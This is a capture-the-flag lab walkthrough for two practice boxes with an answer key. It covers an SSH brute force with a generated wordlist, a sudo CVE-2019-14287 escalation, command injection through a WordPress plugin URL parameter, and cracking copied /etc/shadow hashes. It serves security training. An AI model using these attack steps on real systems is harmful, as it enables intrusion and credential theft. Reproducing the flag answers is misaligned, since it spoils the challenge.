# 2 Boxes 4 Shells - II Solution
 
## Box 1 User

1. Browse to `192.168.86.236`
2. Accept non-secure warning
3. Open developer tools -> Elements
4. Access `192.168.86.236/static/images/favicon/c2lnbnVwX3VzZXJfY29tcGxldGUvP2lkPTdxa3BocXFreHBub3B5Y3N4cGl5cmZvNjl3.txt` in your browser
5. Notice the .b64 ascii art
6. Convert the filename from base64. 
    ```
    echo c2lnbnVwX3VzZXJfY29tcGxldGUvP2lkPTdxa3BocXFreHBub3B5Y3N4cGl5cmZvNjl3 | base64 --decode)
    ```
7. Browse to this newly-found invite link that's outputted 
8. Enter any email/username/password that meets requirements
9. Read Town Square
10. Notice jjohnson's post at 8:30am and dsmith's response at 8:32am on Monday Jun 29
11. One way to create a password list that meets these requirements is rsmangler. First leet the name deion
12. Rsmangler can be difficult to corral by turning off all switches (as they are on by default)
13. To accommodate this, we can do default mangling, and carve out what we need
14. First, we need to leet deion. Create a text file named `initial.txt` and add the name/word "deion"
15. Next: 
    ```
    rsmangler --file initial.txt -o mangled1.txt
    ```
16. Lines 17 and 18 show a mangled 'deion'. Carve them out with the command below.
    - NOTE: only leet'd possibilities do not include special characters and only numbers, so only line 17 (`d310n`) will be used. 
    ```
    sed -n 17p mangled1.txt > mangled2.txt
    ``` 
17. Next, we will want to append 1-99 to both. This can be performed similarly to above by carving or manipulating rsmangler; however, we can also create a script
    ```bash
    #!/bin/bash
    for i in {1..99}
    do
        echo "d310n$i" >> mangled3.txt
    done
    ```

18. Finally, we must append a special character to each item and append to a final wordlist. Another script will work
    ```bash
    #!/bin/bash

    for i in '!' '@' '#' '$' '%' '^';
    do
        sed s/$/$i/ mangled3.txt > mangled4$i.txt
    done
    ```
19. Append all files into one with:
    ```
    cat mangled4* > final-wordlist.txt
    ```
20. Now, use `final-wordlist.txt` as the password list to access the Mattermost box
21. Using nmap shows port 22 is open
22. Open xhydra
    - Target Tab:
        - single target -> 192.168.86.236
        - Port -> 22
        - Protocol -> ssh
        - Select Show Attempts
    - Passwords Tab:
        - Username -> dsmith (as stated in chat)
        - Password list -> location of final-wordlist.txt
    - Start Tab:
        - Click Start and wait. 
23. xhydra will find the password within 10 minutes with this workflow. Time may be more or less based on optimal wordlist
24. Follow these steps and enter the password from xhydra as prompted:
    ```
    ssh dsmith@192.168.86.236 
    ls
    cat token1.txt
    ```

## Box 1 Root

1. The command below shows that there are no files owned by dsmith.
    ```
    find / -group dsmith 2>/dev/null | less
    ```
2. `sudo -V` shows a vulnerable version of sudo. (chat mentioned playing with sudo a bit; however, seeing this in chat is not necessary. Checking sudo is standard for priv esc)
3. `sudo -l` shows that the extremely popular sudo vulnerability of 2019 (2019-14287) is applicable due to the !root config and sudo version
4. We can run `grep` as root. We can make the assumption that since the first token was `token1.txt`, then `token2.txt` is next. However, playing with grep can confirm the filename based off of matches
5. To have grep return the entire contents of a file, we must trick it into matching anything possible within the file (since we don't know the contents of the file)
6. One example of exploiting sudo vulnerability and grepping entire file is:
    ```
    sudo -u#-1 grep --color -E "test|$" /root/token2.txt
    ```

## Box 2 User

1. Browsing to `192.168.86.243` shows a default wordpress box with some plugin information near the top.
2. Read the information, and browse to the plugin. Since it's at the default location, go to `192.168.86.243/wp-content/plugins/timechecker.php`
3. To pass the country name into the php plugin via the URL so the time can be checked, enter `192.168.86.243/wp-content/plugins/timechecker.php?country=Canada`
4. We are now given the time in Canada.
5. We can test if this plugin is vulnerable to command injection. To test this, enter `192.168.86.243/wp-content/plugins/timechecker.php?country=Canada;whoami`
6. We are given www-data. We can run commands via this method.
7. Enter `192.168.86.243/wp-content/plugins/timechecker.php?country=Canada;ls`
8. We see some files, directories, and notes. Enter the note directory with `192.168.86.243/wp-content/plugins/timechecker.phpcountry=Canada;ls -R notes`
9. View `notes.txt` in the notes directory with `192.168.86.243/wp-content/plugins/timechecker.phpcountry=Canada;cat notes/notes.txt`
10. Here we see some dev personal notes, with creds.
11. ssh to the box with the creds found and then use:
    ```
    ls
    cat token3.txt
    ```

## Box 2 Root

1. While logged in Box2 as tlopez via ssh: 
    ```
    ls
    cat more_notes.txt
    ```
2. Notice there is a backed-up version of this server
    ```
    docker images   //shows personal_backup_current_server_dev
    docker run -t -d personal_backup_current_server_dev
    docker ps -a    //shows new container, ID, and Names created X seconds ago
    docker exec -it [Names] bash
    ```
3. History within docker shows shadow history
4. Using the two commands below shows we have access to crack hashes:
    ```
    cat /etc/shadow 
    cat /etc/passwd
    ``` 
5. Copy these files out of docker and box2 to local and then exit docker container:
    ```
    docker cp [Names]:/etc/passwd 
    docker cp [Names]:/etc/shadow
    exit 
    scp lopez@192.168.86.243:~/passwd
    scp lopez@192.168.86.243:~/shadow
    sudo unshadow passwd shadow > unshadowed.txt
    cp /usr/share/wordlists/rockyou.txt.gz 
    gunzip rockyou.txt.gz 
    sudo john --wordlist-rockyou.txt unshadowed.txt
    ```
6. We found the password by cracking the hash.
7. ssh back to box2 and su with password.
8. Then:
    ```
    cd /root
    cat token4.txt
    ```

## Answers

Q1
- `Blue Blazes`

Q2
- `Blue Bombers`

Q3
- `Blue Flame`

Q4
- `Blue Ox`